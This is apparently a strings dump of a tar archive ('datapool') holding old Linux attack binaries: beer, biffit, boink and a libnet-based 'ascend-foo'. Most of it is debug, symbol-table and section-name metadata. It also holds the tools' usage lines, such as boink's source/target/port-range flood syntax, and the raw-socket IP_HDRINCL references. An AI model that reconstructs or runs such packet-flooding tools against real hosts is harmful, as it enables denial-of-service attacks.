            "__fd_set:t(15,39)=(15,40)=s128fds_bits:(15,41)=ar(0,1);0;31;(15,38),0,1024;;",
            "__key_t:t(15,42)=(0,1)",
            "__ipc_pid_t:t(15,43)=(0,9)",
            "__blkcnt_t:t(15,44)=(0,3)",
            "__blkcnt64_t:t(15,45)=(15,6)",
            "__fsblkcnt_t:t(15,46)=(15,4)",
            "__fsblkcnt64_t:t(15,47)=(15,5)",
            "__fsfilcnt_t:t(15,48)=(15,4)",
            "__fsfilcnt64_t:t(15,49)=(15,5)",
            "__ino64_t:t(15,50)=(15,4)",
            "__off64_t:t(15,51)=(15,24)",
            "__t_scalar_t:t(15,52)=(0,1)",
            "__t_uscalar_t:t(15,53)=(0,4)",
            "__intptr_t:t(15,54)=(0,1)",
            "../linuxthreads/sysdeps/pthread/bits/pthreadtypes.h",
            "../sysdeps/unix/sysv/linux/bits/sched.h",
            "__sched_param:T(18,1)=s4sched_priority:(0,1),0,32;;",
            "_pthread_fastlock:T(17,1)=s8__status:(0,3),0,32;__spinlock:(0,1),32,32;;",
            "_pthread_descr:t(17,2)=(17,3)=*(17,4)=xs_pthread_descr_struct:",
            "pthread_attr_t:t(17,5)=(17,6)=s36__detachstate:(0,1),0,32;__schedpolicy:(0,1),32,32;__schedparam:(18,1),64,32;__inheritsched:(0,1),96,32;__scope:(0,1),128,32;__guardsize:(16,1),160,32;__stackaddr_set:(0,1),192,32;__stackaddr:(17,7)=*(0,19),224,32;__stacksize:(16,1),256,32;;",
            "pthread_cond_t:t(17,8)=(17,9)=s12__c_lock:(17,1),0,64;__c_waiting:(17,2),64,32;;",
            "pthread_condattr_t:t(17,10)=(17,11)=s4__dummy:(0,1),0,32;;",
            "pthread_key_t:t(17,12)=(0,4)",
            "pthread_mutex_t:t(17,13)=(17,14)=s24__m_reserved:(0,1),0,32;__m_count:(0,1),32,32;__m_owner:(17,2),64,32;__m_kind:(0,1),96,32;__m_lock:(17,1),128,64;;",
            "pthread_mutexattr_t:t(17,15)=(17,16)=s4__mutexkind:(0,1),0,32;;",
            "pthread_once_t:t(17,17)=(0,1)",
            "pthread_rwlock_t:t(17,18)=(17,19)=s32__rw_lock:(17,1),0,64;__rw_readers:(0,1),64,32;__rw_writer:(17,2),96,32;__rw_read_waiting:(17,2),128,32;__rw_write_waiting:(17,2),160,32;__rw_kind:(0,1),192,32;__rw_pshared:(0,1),224,32;;",
            "pthread_rwlockattr_t:t(17,20)=(17,21)=s8__lockkind:(0,1),0,32;__pshared:(0,1),32,32;;",
            "pthread_t:t(17,22)=(0,5)",
            "wchar_t:t(19,1)=(0,3)",
            "wint_t:t(19,2)=(0,4)",
            "_G_int16_t:t(14,1)=(0,8)",
            "_G_int32_t:t(14,2)=(0,1)",
            "_G_uint16_t:t(14,3)=(0,9)",
            "_G_uint32_t:t(14,4)=(0,4)",
            "_IO_stdin_used:G(0,1)",
            "GCC: (GNU) 2.95.2 19991024 (release)",
            "GCC: (GNU) 2.95.2 19991024 (release)",
            "GCC: (GNU) 2.95.2 19991024 (release)",
            "GCC: (GNU) 2.95.2 19991024 (release)",
            "GCC: (GNU) 2.95.2 19991024 (release)",
            "GCC: (GNU) 2.95.2 19991024 (release)",
            "GCC: (GNU) 2.95.2 19991024 (release)",
            "GCC: (GNU) 2.95.2 19991024 (release)",
            "GCC: (GNU) 2.95.2 19991024 (release)",
            "GCC: (GNU) 2.95.2 19991024 (release)",
            "GCC: (GNU) 2.95.2 19991024 (release)",
            "GCC: (GNU) 2.95.2 19991024 (release)",
            "GCC: (GNU) 2.95.2 19991024 (release)",
            "01.01",
            "01.01",
            "01.01",
            "01.01",
            "01.01",
            "01.01",
            "01.01",
            "01.01",
            "01.01",
            "01.01",
            "01.01",
            "01.01",
            "01.01",
            ".symtab",
            ".strtab",
            ".shstrtab",
            ".interp",
            ".note.ABI-tag",
            ".hash",
            ".dynsym",
            ".dynstr",
            ".gnu.version",
            ".gnu.version_r",
            ".rel.got",
            ".rel.bss",
            ".rel.plt",
            ".init",
            ".plt",
            ".text",
            ".fini",
            ".rodata",
            ".data",
            ".eh_frame",
            ".ctors",
            ".dtors",
            ".got",
            ".dynamic",
            ".bss",
            ".stab",
            ".stabstr",
            ".comment",
            ".note",
            "initfini.c",
            "gcc2_compiled.",
            "init.c",
            "Letext",
            "crtstuff.c",
            "__DTOR_LIST__",
            "completed.4",
            "__do_global_dtors_aux",
            "__EH_FRAME_BEGIN__",
            "fini_dummy",
            "object.11",
            "frame_dummy",
            "init_dummy",
            "force_to_data",
            "__CTOR_LIST__",
            "__do_global_ctors_aux",
            "__CTOR_END__",
            "__DTOR_END__",
            "__FRAME_END__",
            "ascend-foo.c",
            "libnet_resolve.c",
            "hostname.138",
            "hostname2.139",
            "which.140",
            "libnet_socket.c",
            "libnet_checksum.c",
            "libnet_prand.c",
            "libnet_write_ip.c",
            "libnet_build_ip.c",
            "libnet_build_udp.c",
            "libnet_in_cksum",
            "_DYNAMIC",
            "libnet_get_ipaddr",
            "_etext",
            "__register_frame_info@@GLIBC_2.0",
            "close@@GLIBC_2.0",
            "_fp_hw",
            "perror@@GLIBC_2.0",
            "libnet_write_ip",
            "strerror@@GLIBC_2.0",
            "__errno_location@@GLIBC_2.0",
            "gethostbyaddr@@GLIBC_2.0",
            "random@@GLIBC_2.0",
            "_init",
            "malloc@@GLIBC_2.0",
            "libnet_seed_prand",
            "sendto@@GLIBC_2.0",
            "__deregister_frame_info@@GLIBC_2.0",
            "libnet_get_prand",
            "libnet_build_ip",
            "setsockopt@@GLIBC_2.0",
            "libnet_open_raw_sock",
            "libnet_name_resolve",
            "_start",
            "libnet_ip_check",
            "inet_addr@@GLIBC_2.0",
            "__bss_start",
            "main",
            "__libc_start_main@@GLIBC_2.0",
            "data_start",
            "libnet_host_lookup",
            "printf@@GLIBC_2.0",
            "_fini",
            "memcpy@@GLIBC_2.0",
            "libnet_host_lookup_r",
            "gettimeofday@@GLIBC_2.0",
            "gethostbyname@@GLIBC_2.0",
            "exit@@GLIBC_2.0",
            "atoi@@GLIBC_2.0",
            "calloc@@GLIBC_2.0",
            "_edata",
            "_GLOBAL_OFFSET_TABLE_",
            "free@@GLIBC_2.0",
            "_end",
            "ioctl@@GLIBC_2.0",
            "libnet_build_udp",
            "__ctype_b@@GLIBC_2.0",
            "libnet_do_checksum",
            "strncpy@@GLIBC_2.0",
            "_IO_stdin_used",
            "srandom@@GLIBC_2.0",
            "sprintf@@GLIBC_2.0",
            "__data_start",
            "socket@@GLIBC_2.0",
            "libnet_close_raw_sock",
            "__gmon_start__",
            "datapool/bin/beer",
            "0100755",
            "0000000",
            "0000000",
            "00000030530",
            "07100656562",
            "013003",
            "ustar  ",
            "root",
            "root",
            "/lib/ld-linux.so.2",
            "__gmon_start__",
            "libc.so.6",
            "printf",
            "connect",
            "socket",
            "bzero",
            "__deregister_frame_info",
            "bcopy",
            "gethostbyname",
            "htons",
            "exit",
            "atoi",
            "_IO_stdin_used",
            "__libc_start_main",
            "__register_frame_info",
            "GLIBC_2.0",
            "1^PTRhT",
            "fU1fE",
            "UPEP",
            "\u0403;u[]",
            "beer.c by ???",
            "Edited, and made for use with VT/bx by Cyranix0r",
            "Usage: %s <host> <times>",
            "unknown host: %s",
            "init.c",
            "/home/lepied/RPM/BUILD/glibc-2.1/csu/",
            "gcc2_compiled.",
            "int:t(0,1)=r(0,1);0020000000000;0017777777777;",
            "char:t(0,2)=r(0,2);0;127;",
            "long int:t(0,3)=r(0,1);0020000000000;0017777777777;",
            "unsigned int:t(0,4)=r(0,1);0000000000000;0037777777777;",
            "long unsigned int:t(0,5)=r(0,1);0000000000000;0037777777777;",
            "long long int:t(0,6)=r(0,1);01000000000000000000000;0777777777777777777777;",
            "long long unsigned int:t(0,7)=r(0,1);0000000000000;01777777777777777777777;",
            "short int:t(0,8)=r(0,8);-32768;32767;",
            "short unsigned int:t(0,9)=r(0,9);0;65535;",
            "signed char:t(0,10)=r(0,10);-128;127;",
            "unsigned char:t(0,11)=r(0,11);0;255;",
            "float:t(0,12)=r(0,1);4;0;",
            "double:t(0,13)=r(0,1);8;0;",
            "long double:t(0,14)=r(0,1);12;0;",
            "complex int:t(0,15)=s8real:(0,1),0,32;imag:(0,1),32,32;;",
            "complex float:t(0,16)=r(0,16);4;0;",
            "complex double:t(0,17)=r(0,17);8;0;",
            "complex long double:t(0,18)=r(0,18);12;0;",
            "void:t(0,19)=(0,19)",
            "../include/libc-symbols.h",
            "/home2/lepied/RPM/BUILD/glibc-2.1/build-i386-linux/config.h",
            "../include/libintl.h",
            "../intl/libintl.h",
            "../include/features.h",
            "../include/sys/cdefs.h",
            "../misc/sys/cdefs.h",
            "/usr/lib/gcc-lib/i586-mandrake-linux/2.95.2/include/stddef.h",
            "../include/locale.h",
            "../locale/locale.h",
            "lconv:T(10,1)=s48decimal_point:(10,2)=*(0,2),0,32;thousands_sep:(10,2),32,32;grouping:(10,2),64,32;int_curr_symbol:(10,2),96,32;currency_symbol:(10,2),128,32;mon_decimal_point:(10,2),160,32;mon_thousands_sep:(10,2),192,32;mon_grouping:(10,2),224,32;positive_sign:(10,2),256,32;negative_sign:(10,2),288,32;int_frac_digits:(0,2),320,8;frac_digits:(0,2),328,8;p_cs_precedes:(0,2),336,8;p_sep_by_space:(0,2),344,8;n_cs_precedes:(0,2),352,8;n_sep_by_space:(0,2),360,8;p_sign_posn:(0,2),368,8;n_sign_posn:(0,2),376,8;;",
            "../include/xlocale.h",
            "../locale/xlocale.h",
            "__locale_struct:T(13,1)=s36__locales:(13,2)=ar(0,1);0;5;(13,3)=*(13,4)=xslocale_data:,0,192;__ctype_b:(13,5)=*(0,9),192,32;__ctype_tolower:(13,6)=*(0,1),224,32;__ctype_toupper:(13,6),256,32;;",
            "__locale_t:t(13,7)=(13,8)=*(13,1)",
            "../sysdeps/unix/sysv/linux/_G_config.h",
            "../sysdeps/unix/sysv/linux/bits/types.h",
            "size_t:t(16,1)=(0,4)",
            "__u_char:t(15,1)=(0,11)",
            "__u_short:t(15,2)=(0,9)",
            "__u_int:t(15,3)=(0,4)",
            "__u_long:t(15,4)=(0,5)",
            "__u_quad_t:t(15,5)=(0,7)",
            "__quad_t:t(15,6)=(0,6)",
            "__int8_t:t(15,7)=(0,10)",
            "__uint8_t:t(15,8)=(0,11)",
            "__int16_t:t(15,9)=(0,8)",
            "__uint16_t:t(15,10)=(0,9)",
            "__int32_t:t(15,11)=(0,1)",
            "__uint32_t:t(15,12)=(0,4)",
            "__int64_t:t(15,13)=(0,6)",
            "__uint64_t:t(15,14)=(0,7)",
            "__qaddr_t:t(15,15)=(15,16)=*(15,6)",
            "__dev_t:t(15,17)=(15,5)",
            "__uid_t:t(15,18)=(15,3)",
            "__gid_t:t(15,19)=(15,3)",
            "__ino_t:t(15,20)=(15,4)",
            "__mode_t:t(15,21)=(15,3)",
            "__nlink_t:t(15,22)=(15,3)",
            "__off_t:t(15,23)=(0,3)",
            "__loff_t:t(15,24)=(15,6)",
            "__pid_t:t(15,25)=(0,1)",
            "__ssize_t:t(15,26)=(0,1)",
            "__rlim_t:t(15,27)=(0,3)",
            "__rlim64_t:t(15,28)=(15,6)",
            "__id_t:t(15,29)=(15,3)",
            "__fsid_t:t(15,30)=(15,31)=s8__val:(15,32)=ar(0,1);0;1;(0,1),0,64;;",
            "__daddr_t:t(15,33)=(0,1)",
            "__caddr_t:t(15,34)=(10,2)",
            "__time_t:t(15,35)=(0,3)",
            "__swblk_t:t(15,36)=(0,3)",
            "__clock_t:t(15,37)=(0,3)",
            "__fd_mask:t(15,38)=(0,5)",
            "__fd_set:t(15,39)=(15,40)=s128fds_bits:(15,41)=ar(0,1);0;31;(15,38),0,1024;;",
            "__key_t:t(15,42)=(0,1)",
            "__ipc_pid_t:t(15,43)=(0,9)",
            "__blkcnt_t:t(15,44)=(0,3)",
            "__blkcnt64_t:t(15,45)=(15,6)",
            "__fsblkcnt_t:t(15,46)=(15,4)",
            "__fsblkcnt64_t:t(15,47)=(15,5)",
            "__fsfilcnt_t:t(15,48)=(15,4)",
            "__fsfilcnt64_t:t(15,49)=(15,5)",
            "__ino64_t:t(15,50)=(15,4)",
            "__off64_t:t(15,51)=(15,24)",
            "__t_scalar_t:t(15,52)=(0,1)",
            "__t_uscalar_t:t(15,53)=(0,4)",
            "__intptr_t:t(15,54)=(0,1)",
            "../linuxthreads/sysdeps/pthread/bits/pthreadtypes.h",
            "../sysdeps/unix/sysv/linux/bits/sched.h",
            "__sched_param:T(18,1)=s4sched_priority:(0,1),0,32;;",
            "_pthread_fastlock:T(17,1)=s8__status:(0,3),0,32;__spinlock:(0,1),32,32;;",
            "_pthread_descr:t(17,2)=(17,3)=*(17,4)=xs_pthread_descr_struct:",
            "pthread_attr_t:t(17,5)=(17,6)=s36__detachstate:(0,1),0,32;__schedpolicy:(0,1),32,32;__schedparam:(18,1),64,32;__inheritsched:(0,1),96,32;__scope:(0,1),128,32;__guardsize:(16,1),160,32;__stackaddr_set:(0,1),192,32;__stackaddr:(17,7)=*(0,19),224,32;__stacksize:(16,1),256,32;;",
            "pthread_cond_t:t(17,8)=(17,9)=s12__c_lock:(17,1),0,64;__c_waiting:(17,2),64,32;;",
            "pthread_condattr_t:t(17,10)=(17,11)=s4__dummy:(0,1),0,32;;",
            "pthread_key_t:t(17,12)=(0,4)",
            "pthread_mutex_t:t(17,13)=(17,14)=s24__m_reserved:(0,1),0,32;__m_count:(0,1),32,32;__m_owner:(17,2),64,32;__m_kind:(0,1),96,32;__m_lock:(17,1),128,64;;",
            "pthread_mutexattr_t:t(17,15)=(17,16)=s4__mutexkind:(0,1),0,32;;",
            "pthread_once_t:t(17,17)=(0,1)",
            "pthread_rwlock_t:t(17,18)=(17,19)=s32__rw_lock:(17,1),0,64;__rw_readers:(0,1),64,32;__rw_writer:(17,2),96,32;__rw_read_waiting:(17,2),128,32;__rw_write_waiting:(17,2),160,32;__rw_kind:(0,1),192,32;__rw_pshared:(0,1),224,32;;",
            "pthread_rwlockattr_t:t(17,20)=(17,21)=s8__lockkind:(0,1),0,32;__pshared:(0,1),32,32;;",
            "pthread_t:t(17,22)=(0,5)",
            "wchar_t:t(19,1)=(0,3)",
            "wint_t:t(19,2)=(0,4)",
            "_G_int16_t:t(14,1)=(0,8)",
            "_G_int32_t:t(14,2)=(0,1)",
            "_G_uint16_t:t(14,3)=(0,9)",
            "_G_uint32_t:t(14,4)=(0,4)",
            "_IO_stdin_used:G(0,1)",
            "GCC: (GNU) 2.95.2 19991024 (release)",
            "GCC: (GNU) 2.95.2 19991024 (release)",
            "GCC: (GNU) 2.95.2 19991024 (release)",
            "GCC: (GNU) 2.95.2 19991024 (release)",
            "GCC: (GNU) 2.95.2 19991024 (release)",
            "GCC: (GNU) 2.95.2 19991024 (release)",
            "01.01",
            "01.01",
            "01.01",
            "01.01",
            "01.01",
            "01.01",
            ".symtab",
            ".strtab",
            ".shstrtab",
            ".interp",
            ".note.ABI-tag",
            ".hash",
            ".dynsym",
            ".dynstr",
            ".gnu.version",
            ".gnu.version_r",
            ".rel.got",
            ".rel.plt",
            ".init",
            ".plt",
            ".text",
            ".fini",
            ".rodata",
            ".data",
            ".eh_frame",
            ".ctors",
            ".dtors",
            ".got",
            ".dynamic",
            ".bss",
            ".stab",
            ".stabstr",
            ".comment",
            ".note",
            "initfini.c",
            "gcc2_compiled.",
            "init.c",
            "Letext",
            "crtstuff.c",
            "__DTOR_LIST__",
            "completed.4",
            "__do_global_dtors_aux",
            "__EH_FRAME_BEGIN__",
            "fini_dummy",
            "object.11",
            "frame_dummy",
            "init_dummy",
            "force_to_data",
            "__CTOR_LIST__",
            "__do_global_ctors_aux",
            "__CTOR_END__",
            "__DTOR_END__",
            "__FRAME_END__",
            "beer.c",
            "_DYNAMIC",
            "beer",
            "_etext",
            "__register_frame_info@@GLIBC_2.0",
            "_fp_hw",
            "bcopy@@GLIBC_2.0",
            "_init",
            "__deregister_frame_info@@GLIBC_2.0",
            "_start",
            "__bss_start",
            "alcohol",
            "main",
            "__libc_start_main@@GLIBC_2.0",
            "data_start",
            "printf@@GLIBC_2.0",
            "_fini",
            "gethostbyname@@GLIBC_2.0",
            "bzero@@GLIBC_2.0",
            "exit@@GLIBC_2.0",
            "atoi@@GLIBC_2.0",
            "_edata",
            "_GLOBAL_OFFSET_TABLE_",
            "_end",
            "htons@@GLIBC_2.0",
            "connect@@GLIBC_2.0",
            "_IO_stdin_used",
            "__data_start",
            "socket@@GLIBC_2.0",
            "__gmon_start__",
            "datapool/bin/biffit",
            "0100755",
            "0000000",
            "0000000",
            "00000031604",
            "07100656564",
            "013336",
            "ustar  ",
            "root",
            "root",
            "/lib/ld-linux.so.2",
            "__gmon_start__",
            "libc.so.6",
            "printf",
            "perror",
            "socket",
            "bzero",
            "fprintf",
            "__deregister_frame_info",
            "sendto",
            "herror",
            "gethostbyname",
            "sprintf",
            "stderr",
            "htons",
            "exit",
            "_IO_stdin_used",
            "__libc_start_main",
            "strlen",
            "__register_frame_info",
            "close",
            "GLIBC_2.0",
            "1^PTRh",
            "QVh\u0406",
            "u!h?",
            "E}u$hM",
            "fEEP",
            "PEPEP",
            " E}u",
            "lEPh",
            "\u0403;u[]",
            "usage: ",
            "    %s [hostname] [username]",
            "gethostbyname",
            "socket",
            "%s@0",
            "recvfrom",
            "init.c",
            "/home/lepied/RPM/BUILD/glibc-2.1/csu/",
            "gcc2_compiled.",
            "int:t(0,1)=r(0,1);0020000000000;0017777777777;",
            "char:t(0,2)=r(0,2);0;127;",
            "long int:t(0,3)=r(0,1);0020000000000;0017777777777;",
            "unsigned int:t(0,4)=r(0,1);0000000000000;0037777777777;",
            "long unsigned int:t(0,5)=r(0,1);0000000000000;0037777777777;",
            "long long int:t(0,6)=r(0,1);01000000000000000000000;0777777777777777777777;",
            "long long unsigned int:t(0,7)=r(0,1);0000000000000;01777777777777777777777;",
            "short int:t(0,8)=r(0,8);-32768;32767;",
            "short unsigned int:t(0,9)=r(0,9);0;65535;",
            "signed char:t(0,10)=r(0,10);-128;127;",
            "unsigned char:t(0,11)=r(0,11);0;255;",
            "float:t(0,12)=r(0,1);4;0;",
            "double:t(0,13)=r(0,1);8;0;",
            "long double:t(0,14)=r(0,1);12;0;",
            "complex int:t(0,15)=s8real:(0,1),0,32;imag:(0,1),32,32;;",
            "complex float:t(0,16)=r(0,16);4;0;",
            "complex double:t(0,17)=r(0,17);8;0;",
            "complex long double:t(0,18)=r(0,18);12;0;",
            "void:t(0,19)=(0,19)",
            "../include/libc-symbols.h",
            "/home2/lepied/RPM/BUILD/glibc-2.1/build-i386-linux/config.h",
            "../include/libintl.h",
            "../intl/libintl.h",
            "../include/features.h",
            "../include/sys/cdefs.h",
            "../misc/sys/cdefs.h",
            "/usr/lib/gcc-lib/i586-mandrake-linux/2.95.2/include/stddef.h",
            "../include/locale.h",
            "../locale/locale.h",
            "lconv:T(10,1)=s48decimal_point:(10,2)=*(0,2),0,32;thousands_sep:(10,2),32,32;grouping:(10,2),64,32;int_curr_symbol:(10,2),96,32;currency_symbol:(10,2),128,32;mon_decimal_point:(10,2),160,32;mon_thousands_sep:(10,2),192,32;mon_grouping:(10,2),224,32;positive_sign:(10,2),256,32;negative_sign:(10,2),288,32;int_frac_digits:(0,2),320,8;frac_digits:(0,2),328,8;p_cs_precedes:(0,2),336,8;p_sep_by_space:(0,2),344,8;n_cs_precedes:(0,2),352,8;n_sep_by_space:(0,2),360,8;p_sign_posn:(0,2),368,8;n_sign_posn:(0,2),376,8;;",
            "../include/xlocale.h",
            "../locale/xlocale.h",
            "__locale_struct:T(13,1)=s36__locales:(13,2)=ar(0,1);0;5;(13,3)=*(13,4)=xslocale_data:,0,192;__ctype_b:(13,5)=*(0,9),192,32;__ctype_tolower:(13,6)=*(0,1),224,32;__ctype_toupper:(13,6),256,32;;",
            "__locale_t:t(13,7)=(13,8)=*(13,1)",
            "../sysdeps/unix/sysv/linux/_G_config.h",
            "../sysdeps/unix/sysv/linux/bits/types.h",
            "size_t:t(16,1)=(0,4)",
            "__u_char:t(15,1)=(0,11)",
            "__u_short:t(15,2)=(0,9)",
            "__u_int:t(15,3)=(0,4)",
            "__u_long:t(15,4)=(0,5)",
            "__u_quad_t:t(15,5)=(0,7)",
            "__quad_t:t(15,6)=(0,6)",
            "__int8_t:t(15,7)=(0,10)",
            "__uint8_t:t(15,8)=(0,11)",
            "__int16_t:t(15,9)=(0,8)",
            "__uint16_t:t(15,10)=(0,9)",
            "__int32_t:t(15,11)=(0,1)",
            "__uint32_t:t(15,12)=(0,4)",
            "__int64_t:t(15,13)=(0,6)",
            "__uint64_t:t(15,14)=(0,7)",
            "__qaddr_t:t(15,15)=(15,16)=*(15,6)",
            "__dev_t:t(15,17)=(15,5)",
            "__uid_t:t(15,18)=(15,3)",
            "__gid_t:t(15,19)=(15,3)",
            "__ino_t:t(15,20)=(15,4)",
            "__mode_t:t(15,21)=(15,3)",
            "__nlink_t:t(15,22)=(15,3)",
            "__off_t:t(15,23)=(0,3)",
            "__loff_t:t(15,24)=(15,6)",
            "__pid_t:t(15,25)=(0,1)",
            "__ssize_t:t(15,26)=(0,1)",
            "__rlim_t:t(15,27)=(0,3)",
            "__rlim64_t:t(15,28)=(15,6)",
            "__id_t:t(15,29)=(15,3)",
            "__fsid_t:t(15,30)=(15,31)=s8__val:(15,32)=ar(0,1);0;1;(0,1),0,64;;",
            "__daddr_t:t(15,33)=(0,1)",
            "__caddr_t:t(15,34)=(10,2)",
            "__time_t:t(15,35)=(0,3)",
            "__swblk_t:t(15,36)=(0,3)",
            "__clock_t:t(15,37)=(0,3)",
            "__fd_mask:t(15,38)=(0,5)",
            "__fd_set:t(15,39)=(15,40)=s128fds_bits:(15,41)=ar(0,1);0;31;(15,38),0,1024;;",
            "__key_t:t(15,42)=(0,1)",
            "__ipc_pid_t:t(15,43)=(0,9)",
            "__blkcnt_t:t(15,44)=(0,3)",
            "__blkcnt64_t:t(15,45)=(15,6)",
            "__fsblkcnt_t:t(15,46)=(15,4)",
            "__fsblkcnt64_t:t(15,47)=(15,5)",
            "__fsfilcnt_t:t(15,48)=(15,4)",
            "__fsfilcnt64_t:t(15,49)=(15,5)",
            "__ino64_t:t(15,50)=(15,4)",
            "__off64_t:t(15,51)=(15,24)",
            "__t_scalar_t:t(15,52)=(0,1)",
            "__t_uscalar_t:t(15,53)=(0,4)",
            "__intptr_t:t(15,54)=(0,1)",
            "../linuxthreads/sysdeps/pthread/bits/pthreadtypes.h",
            "../sysdeps/unix/sysv/linux/bits/sched.h",
            "__sched_param:T(18,1)=s4sched_priority:(0,1),0,32;;",
            "_pthread_fastlock:T(17,1)=s8__status:(0,3),0,32;__spinlock:(0,1),32,32;;",
            "_pthread_descr:t(17,2)=(17,3)=*(17,4)=xs_pthread_descr_struct:",
            "pthread_attr_t:t(17,5)=(17,6)=s36__detachstate:(0,1),0,32;__schedpolicy:(0,1),32,32;__schedparam:(18,1),64,32;__inheritsched:(0,1),96,32;__scope:(0,1),128,32;__guardsize:(16,1),160,32;__stackaddr_set:(0,1),192,32;__stackaddr:(17,7)=*(0,19),224,32;__stacksize:(16,1),256,32;;",
            "pthread_cond_t:t(17,8)=(17,9)=s12__c_lock:(17,1),0,64;__c_waiting:(17,2),64,32;;",
            "pthread_condattr_t:t(17,10)=(17,11)=s4__dummy:(0,1),0,32;;",
            "pthread_key_t:t(17,12)=(0,4)",
            "pthread_mutex_t:t(17,13)=(17,14)=s24__m_reserved:(0,1),0,32;__m_count:(0,1),32,32;__m_owner:(17,2),64,32;__m_kind:(0,1),96,32;__m_lock:(17,1),128,64;;",
            "pthread_mutexattr_t:t(17,15)=(17,16)=s4__mutexkind:(0,1),0,32;;",
            "pthread_once_t:t(17,17)=(0,1)",
            "pthread_rwlock_t:t(17,18)=(17,19)=s32__rw_lock:(17,1),0,64;__rw_readers:(0,1),64,32;__rw_writer:(17,2),96,32;__rw_read_waiting:(17,2),128,32;__rw_write_waiting:(17,2),160,32;__rw_kind:(0,1),192,32;__rw_pshared:(0,1),224,32;;",
            "pthread_rwlockattr_t:t(17,20)=(17,21)=s8__lockkind:(0,1),0,32;__pshared:(0,1),32,32;;",
            "pthread_t:t(17,22)=(0,5)",
            "wchar_t:t(19,1)=(0,3)",
            "wint_t:t(19,2)=(0,4)",
            "_G_int16_t:t(14,1)=(0,8)",
            "_G_int32_t:t(14,2)=(0,1)",
            "_G_uint16_t:t(14,3)=(0,9)",
            "_G_uint32_t:t(14,4)=(0,4)",
            "_IO_stdin_used:G(0,1)",
            "GCC: (GNU) 2.95.2 19991024 (release)",
            "GCC: (GNU) 2.95.2 19991024 (release)",
            "GCC: (GNU) 2.95.2 19991024 (release)",
            "GCC: (GNU) 2.95.2 19991024 (release)",
            "GCC: (GNU) 2.95.2 19991024 (release)",
            "GCC: (GNU) 2.95.2 19991024 (release)",
            "01.01",
            "01.01",
            "01.01",
            "01.01",
            "01.01",
            "01.01",
            ".symtab",
            ".strtab",
            ".shstrtab",
            ".interp",
            ".note.ABI-tag",
            ".hash",
            ".dynsym",
            ".dynstr",
            ".gnu.version",
            ".gnu.version_r",
            ".rel.got",
            ".rel.bss",
            ".rel.plt",
            ".init",
            ".plt",
            ".text",
            ".fini",
            ".rodata",
            ".data",
            ".eh_frame",
            ".ctors",
            ".dtors",
            ".got",
            ".dynamic",
            ".bss",
            ".stab",
            ".stabstr",
            ".comment",
            ".note",
            "initfini.c",
            "gcc2_compiled.",
            "init.c",
            "Letext",
            "crtstuff.c",
            "__DTOR_LIST__",
            "completed.4",
            "__do_global_dtors_aux",
            "__EH_FRAME_BEGIN__",
            "fini_dummy",
            "object.11",
            "frame_dummy",
            "init_dummy",
            "force_to_data",
            "__CTOR_LIST__",
            "__do_global_ctors_aux",
            "__CTOR_END__",
            "__DTOR_END__",
            "__FRAME_END__",
            "biffit.c",
            "_DYNAMIC",
            "_etext",
            "__register_frame_info@@GLIBC_2.0",
            "close@@GLIBC_2.0",
            "_fp_hw",
            "perror@@GLIBC_2.0",
            "fprintf@@GLIBC_2.0",
            "_init",
            "sendto@@GLIBC_2.0",
            "__deregister_frame_info@@GLIBC_2.0",
            "stderr@@GLIBC_2.0",
            "_start",
            "strlen@@GLIBC_2.0",
            "__bss_start",
            "main",
            "__libc_start_main@@GLIBC_2.0",
            "data_start",
            "printf@@GLIBC_2.0",
            "_fini",
            "gethostbyname@@GLIBC_2.0",
            "bzero@@GLIBC_2.0",
            "exit@@GLIBC_2.0",
            "_edata",
            "_GLOBAL_OFFSET_TABLE_",
            "_end",
            "htons@@GLIBC_2.0",
            "_IO_stdin_used",
            "sprintf@@GLIBC_2.0",
            "__data_start",
            "socket@@GLIBC_2.0",
            "herror@@GLIBC_2.0",
            "__gmon_start__",
            "datapool/bin/boink",
            "0100755",
            "0000000",
            "0000000",
            "00000033576",
            "07100656571",
            "013205",
            "ustar  ",
            "root",
            "root",
            "/lib/ld-linux.so.2",
            "__gmon_start__",
            "libc.so.6",
            "printf",
            "memcpy",
            "perror",
            "socket",
            "fprintf",
            "__deregister_frame_info",
            "setsockopt",
            "sendto",
            "memset",
            "gethostbyname",
            "stderr",
            "htons",
            "exit",
            "atoi",
            "_IO_stdin_used",
            "__libc_start_main",
            "__register_frame_info",
            "close",
            "GLIBC_2.0",
            "1^PTRht",
            "QVh8",
            "1*EP",
            "]U(h",
            "Pz Ej",
            "]U(E",
            "EE;E}",
            "E;E~",
            "E;E|",
            "pEPEPE",
            "REPh9",
            " EEt&",
            "E;Eu",
            "EPEPEPEP\u061d",
            "P EE\ub2d0t&",
            "\u0403;u[]",
            "Usage: ./boink <src_addr> <dst_addr> <start_port> <stop_port> [num]",
            "bad source host",
            "bad target host",
            "socket()",
            "IP_HDRINCL",
            "(%d)%s:%d->%d",
            "Done.",
            "init.c",
            "/home/lepied/RPM/BUILD/glibc-2.1/csu/",
            "gcc2_compiled.",
            "int:t(0,1)=r(0,1);0020000000000;0017777777777;",
            "char:t(0,2)=r(0,2);0;127;",
            "long int:t(0,3)=r(0,1);0020000000000;0017777777777;",
            "unsigned int:t(0,4)=r(0,1);0000000000000;0037777777777;",
            "long unsigned int:t(0,5)=r(0,1);0000000000000;0037777777777;",
            "long long int:t(0,6)=r(0,1);01000000000000000000000;0777777777777777777777;",
            "long long unsigned int:t(0,7)=r(0,1);0000000000000;01777777777777777777777;",
            "short int:t(0,8)=r(0,8);-32768;32767;",
            "short unsigned int:t(0,9)=r(0,9);0;65535;",
            "signed char:t(0,10)=r(0,10);-128;127;",
            "unsigned char:t(0,11)=r(0,11);0;255;",
            "float:t(0,12)=r(0,1);4;0;",
            "double:t(0,13)=r(0,1);8;0;",
            "long double:t(0,14)=r(0,1);12;0;",
            "complex int:t(0,15)=s8real:(0,1),0,32;imag:(0,1),32,32;;",
            "complex float:t(0,16)=r(0,16);4;0;",
            "complex double:t(0,17)=r(0,17);8;0;",
            "complex long double:t(0,18)=r(0,18);12;0;",
            "void:t(0,19)=(0,19)",
            "../include/libc-symbols.h",
            "/home2/lepied/RPM/BUILD/glibc-2.1/build-i386-linux/config.h",
            "../include/libintl.h",
            "../intl/libintl.h",
            "../include/features.h",
            "../include/sys/cdefs.h",
            "../misc/sys/cdefs.h",
            "/usr/lib/gcc-lib/i586-mandrake-linux/2.95.2/include/stddef.h",
            "../include/locale.h",
            "../locale/locale.h",
